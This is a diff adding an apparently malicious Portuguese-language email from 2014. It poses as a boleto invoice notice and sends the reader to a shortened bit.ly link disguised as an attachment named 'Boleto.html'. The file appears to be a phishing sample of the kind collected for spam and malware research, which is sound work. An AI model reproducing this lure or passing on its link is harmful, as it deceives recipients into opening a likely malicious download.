@@ -1,0 +1,58 @@
+Return-path: <adm.rafael_farias@globomail.com>
+Envelope-to: hq@worldfinancesearchengines.com
+Delivery-date: Sat, 25 Oct 2014 20:38:31 -0600
+Received: from [64.120.5.35] (port=35879 helo=rdns-1.ofertasend.info)
+	by rsj14.rhostjh.com with esmtp (Exim 4.82)
+	(envelope-from <adm.rafael_farias@globomail.com>)
+	id 1XiDix-00076X-0h
+	for hq@worldfinancesearchengines.com; Sat, 25 Oct 2014 20:38:31 -0600
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=ofertasend.info;
+ h=From:Subject:To:Content-Type:MIME-Version:Date:Message-Id; i=abuse@ofertasend.info;
+ bh=njO6ms88MvqHkME/Zes1uQSzXR8=;
+ b=Dipvpc+YcqfgI1jjsO2fL1J8oYr5sm+Iq9dxkdNYWwwKDkH9ZK5yFvGIOnqb01SvduCBt+Jcidva
+   qRIzXIudNb0zjG2mij2tt4nY1ZHWAVutFCF2LVb+BcN+MEeqaOAffTA2xo+xsXDeDktVn7px2WrV
+   rIZkBRTdWl7C+sNw+I4=
+From: adm.rafael_farias@globomail.com
+Subject: Webcontas : Envio de fatura R2
+To: hq@worldfinancesearchengines.com
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_707_3776_A7967616.76370650"
+MIME-Version: 1.0
+Date: Sun, 26 Oct 2014 00:38:24 -0200
+Message-Id: <2014102600382367DA32E3EC$E36DE570EB@JB>
+Status: N
+X-Identified-User: {0000:rsj14.rhostjh.com:local:local} {sentby:Delivered locally}
+
+This is a multi-part message in MIME format
+
+------=_NextPart_707_3776_A7967616.76370650
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+ 
+
+  
+
+  Boleto fatura outubro
+
+Anexo: Boleto.html
+
+
+------=_NextPart_707_3776_A7967616.76370650
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> <html><he=
+ad>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-88=
+59-1">
+  <META name=3DGenerator content=3D4.61> <title>Webcontas : Envio de fat=
+ura R2</title>
+ </head>
+ <body> <P><SPAN style=3D"FONT-WEIGHT: bold">Boleto fatura outubro<BR></=
+SPAN><SPAN style=3D"FONT-WEIGHT: bold"><BR></SPAN>Anexo: <A href=3D"http=
+://bit.ly/boletoatualizado39920">Boleto.html</A></P></body>
+ </html>
+ 
+
+------=_NextPart_707_3776_A7967616.76370650--
